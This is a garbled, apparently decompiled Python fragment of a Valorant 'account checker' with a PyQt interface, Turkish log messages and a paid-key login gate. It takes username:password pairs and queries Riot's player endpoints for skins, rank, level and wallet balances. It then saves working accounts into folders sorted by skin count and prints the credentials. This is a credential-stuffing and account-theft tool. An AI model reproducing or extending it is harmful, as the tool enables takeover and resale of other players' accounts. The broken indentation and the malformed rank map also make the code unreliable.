                                            print(f'❌ Failed to fetch Skinlist.txt: {response_API.status_code}')
                                                continue
                                            skins_list = response_API.text.splitlines()
                                            skins = skin_response.json().get('Entitlements', [])
                                            for skin in skins:
                                                uid_to_search = skin['ItemID'].lower()
                                                for item in skins_list:
                                                    details = item.split('|')
                                                    if len(details) < 2:
                                                        continue
                                                    else:
                                                        name_part, id_part = (details[0], details[1])
                                                        name = name_part.split(':')[1].strip()
                                                        skin_id = id_part.split(':')[0].lower().strip()
                                                        if skin_id == uid_to_search and name.lower() not in ['standard', 'default', 'random'] and (name not in skin_names):
                                                                    skin_names.append(name)
                                        print(f'❌ Failed to get store entitlements ({region}): {skin_response.status_code}')
                                        skin_names = []
                                                loadout_response = requests.get(f'https://pd.{region}.a.pvp.net/personalization/v1/players/{puuid}/playerloadout', headers=headers_game, timeout=10)
                                                if loadout_response.status_code == 200:
                                                    loadout_data = loadout_response.json()
                                                    if 'skins_list' not in locals():
                                                        response_API = requests.get('https://raw.githubusercontent.com/xharky/Valorant-list/main/Skinlist.txt', timeout=10)
                                                        if response_API.status_code!= 200:
                                                            print(f'❌ Failed to fetch Skinlist.txt for loadout: {response_API.status_code}')
                                                                continue
                                                            skins_list = response_API.text.splitlines()
                                                                for weapon in loadout_data.get('Guns', []):
                                                                    skin_uuid = weapon.get('SkinID')
                                                                    if skin_uuid:
                                                                        for item in skins_list:
                                                                            details = item.split('|')
                                                                            if len(details) < 2:
                                                                                continue
                                                                            else:
                                                                                name_part, id_part = (details[0], details[1])
                                                                                name = name_part.split(':')[1].strip()
                                                                                skin_id = id_part.split(':')[0].lower().strip()
                                                                                if skin_id == skin_uuid.lower() and name.lower() not in ['standard', 'default', 'random'] and (name not in skin_names):
                                                                                            skin_names.append(name)
                                                                    xp_data = requests.get(f'https://pd.{region}.a.pvp.net/account-xp/v1/players/{puuid}', headers=headers_game, timeout=10)
                                                                    xp_data = xp_data.json() if xp_data.status_code == 200 else {}
                                                                    mmr_data = requests.get(f'https://pd.{region}.a.pvp.net/mmr/v1/players/{puuid}', headers=headers_game, timeout=10)
                                                                    mmr_data = mmr_data.json() if mmr_data.status_code == 200 else {}
                                                                    wallet = requests.get(f'https://pd.{region}.a.pvp.net/store/v1/wallet/{puuid}', headers=headers_game, timeout=10)
                                                                    wallet = wallet.json() if wallet.status_code == 200 else {}
                                                                    seasonal = mmr_data.get('QueueSkills', {}).get('competitive', {}).get('SeasonalInfoBySeasonID', {})
                                                                    rank = 0
                                                                    rating = 0
                                                                    if seasonal:
                                                                        latest = sorted(seasonal.keys())[(-1)]
                                                                        rank = seasonal[latest].get('CompetitiveTier', 0)
                                                                        rating = seasonal[latest].get('RankedRating', 0)
                                                                    rank_map = {0: 'Unranked', 1: 'Iron 1', 2: 'Iron 2', 3: 'Iron 3', 4: 'Bronze 1', 5: 'Bronze 2', 6: 'Bronze 3', 7: 'Silver 1', 8: 'Silver 2', 9: 'Silver 3', 10: 'Gold 1', 11: 'Gold 2', 12: 'Gold 3', 13: 'Platinum 1', 14: 'Platinum 2', 15: 'Platinum 3', 16: 'Diamond 1', Diamond 2: {17: 'Diamond 3', 18: 'Ascendant 1', 19: 'Ascendant 2', 20: 'Ascendant 3', 21: 'Immortal 1', 22: 'Immortal 2', 23: 'Immortal 3', 24: 'Radiant', 25: '17'}}
                                                                    account_info = {'puuid': puuid, 'game_name': user_info.get('acct', {}).get('game_name', 'N/A'), 'tag_line': user_info.get('acct', {}).get('tag_line', 'N/A'), 'account_level': xp_data.get('Progress', {}).get('Level', 'N/A'), 'rank_rating': rating, 'valorant_points': wallet.get('Balances', {}).get('85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741', 0), 'radianite_points': wallet.get('Balances', {}).get('e59aa87c-4cbf-517a-5983-6e81511be9b7', 0), 'skin_names': skin_names, 'last_checked': datetime.now().strftime('%Y-%m-%d %H:%M:%S'), 'access_token': access_token, 'entitlements_token': entitlements_token, 'account_info': account_info, 'QTextEdit': QTextEdit}
                                                                    self.save_account_info(account_info)
                                                                    print(f'✅ Account info retrieved for {username}:{password}, Skins: {len(skin_names)}, Rank: {rank_map.get(rank, 'Unranked')}')
                                                                    return account_info
                                print(f'❌ Failed to get data from any region for {username}:{password}')
                                                except Exception as e:
                                                        print(f'❌ Region {region} error: {str(e)}')
                except Exception as e:
                        print(f'❌ get_account_info_and_entitlements error for {username}:{password}: {str(e)}')
    def get_client_version(self):
        # irreducible cflow, using cdg fallback
        response = requests.get('https://valorant-api.com/v1/version', timeout=10)
        if response.status_code == 200:
            return response.json()['data']['riotClientVersion']
            return '31.0.0.0'
                except Exception as e:
                        return '31.0.0.0'
    def save_account_info(self, account_info):
        if not account_info:
            return
        else:
            skin_count = account_info.get('skin_count', 0)
            game_name = account_info.get('game_name', 'unknown')
            tag_line = account_info.get('tag_line', '0000')
            username = account_info.get('username', 'unknown')
            password = account_info.get('password', 'unknown')
            folder_name = None
            for name, (min_skins, max_skins) in skin_folders.items():
                pass
            if min_skins <= skin_count <= max_skins:
                    folder_name = name
                    break
        if not folder_name:
            folder_name = '0-4'
            os.makedirs(os.path.join(working_accounts_dir, folder_name), exist_ok=True)
        folder_path = os.path.join(working_accounts_dir, folder_name)
        base_filename = f'{skin_count}skin_{game_name}#{tag_line}.txt'
        file_path = os.path.join(folder_path, base_filename)
        counter = 1
        if os.path.exists(file_path):
            file_path = os.path.join(folder_path, f'{skin_count}skin_{counter}_{game_name}#{tag_line}.txt')
            counter += 1
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(account_info, f, indent=4, ensure_ascii=False)
            self.update_log(f'✅ Hesap kaydedildi: {file_path}')
        except Exception as e:
            return None
    def closeEvent(self, event):
        self.stop_checking()
        event.accept()
def load_key_from_file():
    # irreducible cflow, using cdg fallback
    if os.path.exists(KEY_FILE):
        pass
    with open(KEY_FILE, 'r') as f:
        data = json.load(f)
        key = data.get('key')
        expires_at_str = data.get('expires_at')
        if key and expires_at_str:
            expires_at = datetime.strptime(expires_at_str, '%Y-%m-%d %H:%M:%S')
            if datetime.now() < expires_at:
                print(f'Yerel anahtar geçerli, süresi: {expires_at_str}')
                print('Yerel anahtarın süresi dolmuş.')
                os.remove(KEY_FILE)
        except (IOError, json.JSONDecodeError) as e:
                print(f'Hata: Anahtar dosyası okunamadı veya bozuk. {e}')
def main():
    app = QApplication([])
    app.setStyle('Fusion')
    valid_key = load_key_from_file()
    if valid_key:
        main_window = MainWindow()
        main_window.show()
    else:
        login_window = KeyLoginWindow()
        login_window.show()
    app.exec_()
if __name__ == '__main__':
    main()
